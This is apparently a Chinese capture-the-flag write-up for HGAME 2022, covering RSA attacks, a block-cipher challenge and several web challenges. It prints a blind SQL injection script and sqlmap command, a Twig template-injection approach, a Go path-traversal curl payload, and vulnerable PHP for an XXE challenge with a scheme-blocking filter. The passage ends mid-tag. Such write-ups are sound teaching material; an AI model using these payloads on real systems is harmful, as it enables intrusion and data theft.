</strong></p><p>e=7像低加密指数分解攻击，直接开七次方</p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2se &#x3D; 7# 读入 n, 密文n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625print(&#39;n&#x3D;&#39;, n)print(&#39;c&#x3D;&#39;, c)result &#x3D; gmpy2.iroot(c, 7)print(&#39;  [-]The c has cubic root?&#39;, result[1])if result[1]:    print(&#39;  [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0]))</code></pre><p>得到m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141</p><p>转字符串的为AttacK^mEThodS^whAT:other!A</p><p><strong>第三段</strong></p><p>共模攻击</p><pre class="language-none"><code class="language-none">from gmpy2 import *from libnum import n2sn &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729e1 &#x3D; 2519901323e2 &#x3D; 3676335737s &#x3D; gcdext(e1, e2)s1 &#x3D; s[1]s2 &#x3D; -s[2]c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861e2 &#x3D; 3676335737c2 &#x3D; invert(c2, n)m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % nprint(m)print(n2s(int(m)))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129192505430.png" alt="image-20220129192505430"></p><p>最终flag</p><pre class="language-none"><code class="language-none">hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;</code></pre><h1 id="第三周wp"><a href="#第三周wp" class="headerlink" title="第三周wp"></a>第三周wp</h1><h2 id="CRYPTO-2"><a href="#CRYPTO-2" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>这周密码比上周要简单</p><h3 id="Multi-Prime-RSA"><a href="#Multi-Prime-RSA" class="headerlink" title="Multi Prime RSA"></a>Multi Prime RSA</h3><p>加密脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204171309886.png" alt="image-20220204171309886"></p><p>给了这除了flag其他的变量都给了</p><pre class="language-none"><code class="language-none">p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919e &#x3D; 65537c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</code></pre><p>直接找个rsa的解密脚本带进去就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204123448819.png" alt="image-20220204123448819"></p><h3 id="RSA-Attack-3"><a href="#RSA-Attack-3" class="headerlink" title="RSA Attack 3"></a>RSA Attack 3</h3><p>加密脚本</p><pre class="language-none"><code class="language-none">from Crypto.Util.number import getPrimefrom gmpy2 import invertfrom libnum import s2nfrom secret import flagp &#x3D; getPrime(2048)q &#x3D; getPrime(2048)n &#x3D; p * qd &#x3D; getPrime(64)e &#x3D; invert(d, (p - 1) * (q - 1))c &#x3D; pow(s2n(flag), e, n)print(f&quot;n &#x3D; &#123;n&#125;&quot;)print(f&quot;e &#x3D; &#123;e&#125;&quot;)print(f&quot;c &#x3D; &#123;c&#125;&quot;)</code></pre><p>只给了nec，想要得到明文还要有d，要求d就要指定pq。</p><p>利用rsactftool求公钥私钥文件然后得到pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172702618.png" alt="image-20220204172702618"></p><p>得到公钥</p><pre class="language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7w&#x3D;&#x3D;-----END PUBLIC KEY-----</code></pre><p>再用公钥求私钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172751433.png" alt="image-20220204172751433"></p><p>得到私钥</p><pre class="language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCotra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enIFkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmkaUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoNduZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6FlIDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1XDzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiDfG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8CCQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hVCAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3LBeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3vgPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92flUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28-----END RSA PRIVATE KEY-----</code></pre><p>再利用私钥求pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172904395.png" alt="image-20220204172904395"></p><p>得到pq之后找个rsa脚本带进去就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172948397.png" alt="image-20220204172948397"></p><h3 id="Block-Cipher"><a href="#Block-Cipher" class="headerlink" title="Block Cipher"></a>Block Cipher</h3><p>加密脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173328550.png" alt="image-20220204173328550"></p><p>给了三个值</p><p>iv = b&#39;Up\x14\x98r\x14%\xb9&#39;</p><p>key = b&#39;\r\xe8\xb86\x9c33^&#39;</p><p>parts = [b&#39;0\xff\xcd\xc3\x8b\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]</p><p>加密的逻辑大致是将flag每八个字符一组，不够的在末尾加上chr(len(该段长度))重复一定次数凑够八个字符,同时构造有八组数据的iv和key变量，并与flag分成的组进行一次异或操作，将异或操作后的内容作为下一次异或操作的iv。同时将异或后的内容放入results列表中</p><p>其中返回值的内容都是可迭代类型，所以要利用for循环才能读出里面的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175512017.png" alt="image-20220204175512017"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173726545.png" alt="image-20220204173726545"></p><p>八个一组的数字</p><p>也就相当于第一组48 = 85^13^ord(flag的第一个字符)即ord(&#39;h&#39;)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175945549.png" alt="image-20220204175945549"></p><p>经过测试这个也能逆推</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180050478.png" alt="image-20220204180050478"></p><p>所以只要根据加密脚本将flag变为给的parts里的内容就能分段解密</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180213786.png" alt="image-20220204180213786"></p><p>贴一下其他师傅写的解码脚本（我是菜b</p><pre class="language-python" data-language="python"><code class="language-python">import operatorimport gmpy2from Crypto.Util.number import long_to_bytesimport randomfrom functools import reduceiv &#x3D; b&#39;Up\x14\x98r\x14%\xb9&#39;key &#x3D; b&#39;\r\xe8\xb86\x9c33^&#39;parts &#x3D; [b&#39;0\xff\xcd\xc3\x8b\\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]results &#x3D; []def xor(a, b):    assert len(a) &#x3D;&#x3D; len(b)    return bytes(map(operator.xor, a, b))def decrypt():    for index, part in enumerate(parts):        results.append(reduce(xor, [part, iv if index &#x3D;&#x3D; 0 else parts[index - 1], key]))decrypt()print(results)</code></pre><h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>看一下这个路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190318143.png" alt="image-20220204190318143"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190356431.png" alt="image-20220204190356431"></p><p>再结合</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190428652.png" alt="image-20220204190428652"></p><p>猜测是twig的模板注入</p><p>参考链接</p><p><a href="https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190615656.png" alt="image-20220204190615656"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190633423.png" alt="image-20220204190633423"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190655380.png" alt="image-20220204190655380"></p><p>cat应该是被过滤了，可以用tac看一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190732690.png" alt="image-20220204190732690"></p><p>把含有hgame内容的字符串也过滤了，尝试逆向输出</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190810214.png" alt="image-20220204190810214"></p><p>成功，拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190827635.png" alt="image-20220204190827635"></p><h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>看这个描述就像支付逻辑漏洞</p><p>先随便注册个账户进入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180704485.png" alt="image-20220204180704485"></p><p>看看商店，flag要一万，我们只有九千九百九十九</p><p>先买个徽章试试</p><p>发现购买的徽章如果删除，购买花费的钱也会返还，所以试试再开一个网页，同时删除徽章</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180850691.png" alt="image-20220204180850691"></p><p>成功大于一万了，买个flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180917539.png" alt="image-20220204180917539"></p><h3 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe*"></a>LoginMe*</h3><p>sql注入，给的hint很明显就是sql语句</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212223934416.png" alt="image-20220212223934416"></p><p>但是因为平常的题都是mysql的，这个是 sqlite，所以只试出了注入点，其他的就没注</p><p>sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表sqlite_master。</p><p>该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据，常见语句如下。</p><pre class="language-none"><code class="language-none">1 读取表名：select group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39;2 读取字段：select group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;表名&#39;</code></pre><p>看看表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232736925.png" alt="image-20220212232736925"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232755661.png" alt="image-20220212232755661"></p><p>证明确实能注，可以写个脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212233244464.png" alt="image-20220212233244464"></p><p>反正最后表名是uuussseeerrrsss</p><p>后边的脚本（手注太慢了</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot;date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125;flag &#x3D; &#39;&#39;for i in range(1,200):    for j in range(31,127):        #列名        #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        #读数据        date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        r &#x3D; requests.post(url,json&#x3D;date);        response &#x3D; r.text        if &#39;success&#39; in response:            flag +&#x3D;chr(j)            print(flag)            breakprint(flag)</code></pre><p>拿到密码之后登录就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213003003539.png" alt="image-20220213003003539"></p><p>也可以用sqlmap直接跑</p><p>bp抓包之后保存到本地</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004158890.png" alt="image-20220213004158890"></p><p>然后上sqlmap</p><p>python sqlmap.py -r &quot;D:\Desktop\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004815203.png" alt="image-20220213004815203"></p><h1 id="第四周wp"><a href="#第四周wp" class="headerlink" title="第四周wp"></a>第四周wp</h1><h2 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB"></a>WEB</h2><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>又是go语言的题</p><p>很明显flag在there may be a flag里但是没法访问到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215644843.png" alt="image-20220214215644843"></p><p>因为根据main.go里的内容可以看到这个路由被出题人加上了web服务,从而使得我们没法通过直接访问<code>/there may be a flag</code>来获取文件。而是得到<code>/there may be a flag</code>路由的回显。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215629146.png" alt="image-20220214215629146"></p><p>谷歌找一下ctf里出现过的go语言漏洞</p><p><a href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215905860.png" alt="image-20220214215905860"></p><p>利用相对路径访问</p><p>对于 CONNECT 请求，路径和主机保持不变。</p><p>和这道题的考点一模一样，可以仿照其payload仿写一个</p><pre class="language-none"><code class="language-none">curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215820089.png" alt="image-20220214215820089"></p><h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment*"></a>Comment*</h3><p>考点：xxe注入</p><p>源码：</p><pre class="language-none"><code class="language-none">&lt;?phprequire &#39;.&#x2F;init.php&#39;;require_once &#39;.&#x2F;db.php&#39;;libxml_disable_entity_loader(false);function waf($str): bool &#123;    if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123;        return true;    &#125;    return false;&#125;function save() &#123;    if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123;        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]);        return;    &#125;    $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);    if (waf($data)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        return;    &#125;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;);    $stmt-&gt;execute([$id, $data]);    if ($stmt-&gt;rowCount() !&#x3D; 0) &#123;        echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]);    &#125; else &#123;        http_response_code(500);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]);    &#125;&#125;function parseXML($str) &#123;    $dom &#x3D; new DOMDocument();    try &#123;        $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);    &#125; catch (Exception $e) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]);        die();    &#125;    $attrs &#x3D; simplexml_import_dom($dom);    if (!isset($attrs-&gt;content)) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]);        die();    &#125;    if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        die();    &#125;    if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123;        $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;;        $attrs-&gt;content &#x3D; $flag;    &#125;    return $attrs;&#125;function get() &#123;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;);    $stmt-&gt;execute([$id]);    $data &#x3D; $stmt-&gt;fetchAll();    $result &#x3D; [];    foreach ($data as $key &#x3D;&gt; $val) &#123;        array_push($result, parseXML($val[&#39;content&#39;]));    &#125;    echo json_encode($result);&#125;switch ($_GET[&#39;action&#39;]) &#123;    case &#39;get&#39;:        get();        break;    case &#39;add&#39;:        save();        break;    case &#39;info&#39;:        echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]);        break;    default:        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]);        break;&#125;</code></pre><p>先抓个包看看</p><p><img 